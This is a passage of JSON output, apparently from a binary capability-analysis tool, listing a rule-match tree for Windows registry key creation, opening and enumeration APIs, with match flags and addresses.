                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651776614
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776352
                        },
                        {
                          "type": "absolute",
                          "value": 1651776582
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumKeyEx"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776576
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryInfoKeyA"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwQueryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwEnumerateKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQueryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtEnumerateKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RtlCheckRegistryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHEnumKeyEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHQueryInfoKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegEnumUSKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegQueryInfoUSKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetSubKeyNames"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651780816
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "create or open registry key"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651780938
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651781495
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651780816
                        },
                        {
                          "type": "absolute",
                          "value": 1651781454
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumKeyEx"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651781444
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryInfoKeyA"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwQueryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwEnumerateKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQueryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtEnumerateKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RtlCheckRegistryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHEnumKeyEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHQueryInfoKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegEnumUSKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegQueryInfoUSKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetSubKeyNames"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651782064
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "create or open registry key"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651782141
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
